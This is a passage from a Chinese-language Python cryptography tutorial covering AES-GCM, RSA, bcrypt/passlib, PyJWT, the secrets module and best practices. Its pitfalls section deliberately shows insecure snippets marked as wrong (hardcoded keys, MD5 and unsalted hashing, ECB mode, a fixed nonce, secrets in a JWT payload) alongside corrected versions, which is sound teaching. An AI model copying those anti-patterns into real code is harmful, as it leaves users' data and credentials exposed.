    """AES-GCM解密"""
    aesgcm = AESGCM(key)
    ciphertext_with_tag = ciphertext + tag
    return aesgcm.decrypt(nonce, ciphertext_with_tag, associated_data=None)

# 使用示例
message = "这是AES-GCM加密的消息".encode()
nonce, ct, tag, key = encrypt_aes_gcm(message)
print(f"密钥: {key.hex()}")
print(f"Nonce: {nonce.hex()}")
print(f"密文: {ct.hex()}")
print(f"Tag: {tag.hex()}")

decrypted = decrypt_aes_gcm(nonce, ct, tag, key)
print(f"解密: {decrypted.decode()}")

# 带附加数据（AAD）- 认证但不加密的数据（如请求头）
def encrypt_aead(plaintext: bytes, aad: bytes, key: bytes = None):
    if key is None:
        key = AESGCM.generate_key(bit_length=256)
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, plaintext, aad)
    return nonce, ct, key

# AAD用于认证关联数据（如请求ID、用户ID）
# 如果AAD被篡改，解密也会失败
\`\`\`

---

## 四、非对称加密（RSA/ECC）

### 4.1 RSA加密与签名

\`\`\`python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

# 1. 生成RSA密钥对
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,  # 至少2048，推荐4096
    backend=default_backend()
)
public_key = private_key.public_key()

# 2. 序列化密钥保存
pem_private = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.BestAvailableEncryption(b"password")  # 密钥加密
)
pem_public = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

with open("private_key.pem", "wb") as f:
    f.write(pem_private)
with open("public_key.pem", "wb") as f:
    f.write(pem_public)

# 3. RSA加密（公钥加密，私钥解密）
# 注意：RSA加密长度有限，通常只用于加密对称密钥
def rsa_encrypt(public_key_pem: bytes, data: bytes) -> bytes:
    from cryptography.hazmat.primitives.serialization import load_pem_public_key
    pub_key = load_pem_public_key(public_key_pem)
    return pub_key.encrypt(
        data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def rsa_decrypt(private_key_pem: bytes, ciphertext: bytes, password: bytes = None) -> bytes:
    from cryptography.hazmat.primitives.serialization import load_pem_private_key
    priv_key = load_pem_private_key(private_key_pem, password=password)
    return priv_key.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

# 4. RSA签名（私钥签名，公钥验证）
def rsa_sign(private_key_pem: bytes, message: bytes, password: bytes = None) -> bytes:
    from cryptography.hazmat.primitives.serialization import load_pem_private_key
    priv_key = load_pem_private_key(private_key_pem, password=password)
    return priv_key.sign(
        message,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )

def rsa_verify(public_key_pem: bytes, message: bytes, signature: bytes) -> bool:
    from cryptography.hazmat.primitives.serialization import load_pem_public_key
    from cryptography.exceptions import InvalidSignature
    pub_key = load_pem_public_key(public_key_pem)
    try:
        pub_key.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except InvalidSignature:
        return False

# 数字证书X.509基础操作（略）
\`\`\`

---

## 五、密码哈希（bcrypt/argon2）

### 5.1 密码哈希算法对比

| 算法 | 是否内置盐 | 自适应成本 | 推荐 |
|------|-----------|-----------|------|
| MD5/SHA | ❌ | ❌ | ❌ 绝对不要用 |
| SHA+固定盐 | ❌ | ❌ | ❌ 彩虹表可破 |
| bcrypt | ✅ | ✅ | ✅ 推荐 |
| argon2 | ✅ | ✅ | ✅ 最新推荐（PHC获胜者） |
| PBKDF2 | 需手动 | ✅ | ⚠️ 标准但弱于bcrypt/argon2 |

### 5.2 bcrypt使用

\`\`\`bash
pip install bcrypt
\`\`\`

\`\`\`python
import bcrypt

def hash_password(password: str) -> str:
    """哈希密码（自动加盐）"""
    # rounds=12 表示2^12=4096次迭代，根据服务器性能调整
    # 每次调用生成不同的盐，所以相同密码哈希不同
    salt = bcrypt.gensalt(rounds=12)
    hashed = bcrypt.hashpw(password.encode("utf-8"), salt)
    return hashed.decode("utf-8")

def verify_password(password: str, hashed: str) -> bool:
    """验证密码"""
    try:
        return bcrypt.checkpw(
            password.encode("utf-8"),
            hashed.encode("utf-8")
        )
    except ValueError:
        return False

# 使用
password = "my_password_123"
hashed_pw = hash_password(password)
print(f"哈希后: {hashed_pw}")
# 输出类似: $2b$12$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
# 格式: $算法$轮数$盐+哈希

assert verify_password("my_password_123", hashed_pw) == True
assert verify_password("wrong_password", hashed_pw) == False

# 不同时间哈希同一密码，结果不同（因为盐不同）
hash1 = hash_password("password")
hash2 = hash_password("password")
assert hash1 != hash2  # 哈希值不同
assert verify_password("password", hash1) == True
assert verify_password("password", hash2) == True
\`\`\`

### 5.3 passlib库（统一接口）

\`\`\`bash
pip install passlib[bcrypt]
\`\`\`

\`\`\`python
from passlib.context import CryptContext

# 配置密码哈希上下文
pwd_context = CryptContext(
    schemes=["bcrypt", "argon2"],  # 支持的算法，按优先级
    default="bcrypt",
    bcrypt__rounds=12,
    deprecated="auto",
)

def hash_password(password: str) -> str:
    return pwd_context.hash(password)

def verify_password(password: str, hashed: str) -> bool:
    return pwd_context.verify(password, hashed)

# 自动升级旧算法哈希
def verify_and_update(password: str, hashed: str) -> tuple[bool, str]:
    """验证密码，如果哈希算法过时则返回新哈希"""
    is_valid, new_hash = pwd_context.verify_and_update(password, hashed)
    if is_valid and new_hash:
        # 需要更新数据库中的哈希
        return True, new_hash
    return is_valid, hashed
\`\`\`

---

## 六、JWT库对比

### 6.1 Python JWT库对比

| 库 | 特点 | 维护状态 |
|----|------|---------|
| PyJWT | 最流行，轻量 | ✅ 活跃 |
| python-jose | 功能全面，FastAPI推荐 | ✅ 活跃 |
| authlib | 完整OAuth/OIDC支持 | ✅ 活跃 |
| joserfc | 新一代JOSE库 | ✅ 活跃 |

### 6.2 PyJWT使用

\`\`\`bash
pip install pyjwt[crypto]
\`\`\`

\`\`\`python
import jwt
from datetime import datetime, timedelta
import secrets

SECRET_KEY = secrets.token_urlsafe(64)

def create_token(data: dict, expires_delta: timedelta = None):
    payload = data.copy()
    expire = datetime.utcnow() + (expires_delta or timedelta(minutes=15))
    payload.update({
        "exp": expire,
        "iat": datetime.utcnow(),
        "jti": secrets.token_hex(16),
    })
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

def decode_token(token: str):
    try:
        return jwt.decode(
            token,
            SECRET_KEY,
            algorithms=["HS256"],
            options={"require": ["exp", "iat"]}
        )
    except jwt.ExpiredSignatureError:
        raise ValueError("Token已过期")
    except jwt.InvalidTokenError as e:
        raise ValueError(f"Token无效: {e}")
\`\`\`

---

## 七、安全随机数（secrets模块）

### 7.1 为什么不用random模块

\`\`\`python
# ❌ 错误：random是伪随机数生成器(PRNG)，不安全
import random
token = random.randint(100000, 999999)  # 可预测！

# ✅ 正确：使用secrets模块（CSPRNG，密码学安全）
import secrets

# 生成安全随机整数
code = secrets.randbelow(900000) + 100000  # 6位验证码

# 生成安全随机字节
random_bytes = secrets.token_bytes(32)  # 32字节随机数

# 生成URL安全的随机字符串
secure_token = secrets.token_urlsafe(32)  # 约43字符

# 生成十六进制随机串
hex_token = secrets.token_hex(32)  # 64字符十六进制

# 从序列中安全选择
recovery_codes = [secrets.token_hex(4) for _ in range(8)]

# 比较（防时序攻击）
# secrets.compare_digest(a, b) 等价于 hmac.compare_digest
\`\`\`

### 7.2 secrets常见用途

\`\`\`python
# 1. 生成重置密码Token
reset_token = secrets.token_urlsafe(32)
# 存储到Redis，设置过期时间（如1小时）

# 2. 生成API Key
api_key = f"sk_{secrets.token_urlsafe(32)}"
# sk_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

# 3. 生成会话ID
session_id = secrets.token_hex(32)

# 4. 生成CSRF Token
csrf_token = secrets.token_urlsafe(32)

# 5. 生成加密用的IV/Nonce
iv = secrets.token_bytes(16)  # AES-CBC IV (16字节)
nonce = secrets.token_bytes(12)  # AES-GCM nonce (12字节)
\`\`\`

---

## 八、最佳实践与常见坑点

### 8.1 加密最佳实践

1. **不要自己实现加密算法**：使用标准库（cryptography）
2. **不要使用ECB模式**：使用GCM或ChaCha20-Poly1305
3. **不要用MD5/SHA1做安全用途**：使用SHA-256或更强
4. **密码必须用慢哈希算法**：bcrypt/argon2，绝不能明文或MD5
5. **使用secrets而非random**：所有安全相关随机数
6. **密钥管理**：密钥不硬编码，使用环境变量/KMS
7. **IV/Nonce必须随机且不重复**：同一密钥下IV重用会导致灾难
8. **使用认证加密（AEAD）**：AES-GCM/ChaCha20-Poly1305

\`\`\`python
# ❌ 反模式：硬编码密钥
SECRET = "hardcoded_secret_123"

# ❌ 反模式：密码用MD5
import hashlib
hashed = hashlib.md5(password.encode()).hexdigest()

# ❌ 反模式：ECB模式
cipher = Cipher(algorithms.AES(key), modes.ECB())

# ❌ 反模式：random生成Token
token = random.choice(string.ascii_letters + string.digits)

# ✅ 正确：环境变量存储密钥
import os
SECRET = os.environ["SECRET_KEY"]
# 启动时检查
if not SECRET or len(SECRET) < 32:
    raise RuntimeError("SECRET_KEY环境变量未正确设置")
\`\`\`

### 8.2 常见坑点

**坑点1：重复使用Nonce/IV**

\`\`\`python
# ❌ 错误：固定nonce
nonce = b"fixed_nonce_12"  # 同一密钥下nonce重用会泄露明文！

# ✅ 正确：每次加密随机生成
nonce = os.urandom(12)
# nonce不需要保密，但必须唯一（和密文一起传输/存储）
\`\`\`

**坑点2：密码哈希不加盐**

\`\`\`python
# ❌ 错误：无盐哈希，相同密码哈希相同，彩虹表攻击
# 彩虹表：预先计算常见密码的哈希值，反查密码
import hashlib
hashed = hashlib.sha256(password.encode()).hexdigest()

# ✅ 正确：bcrypt自动加盐，内置迭代
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))
\`\`\`

**坑点3：JWT敏感数据泄露**

\`\`\`python
# ❌ 错误：Payload仅Base64编码，不加密！
token = jwt.encode({
    "user_id": 1,
    "password": "my_password",  # 任何人都能解码看到
    "credit_card": "1234-5678-9012-3456"
}, key)

# JWT Payload不是加密的，只是编码！
# 需要加密请使用JWE（JSON Web Encryption）
\`\`\`
`
  }
]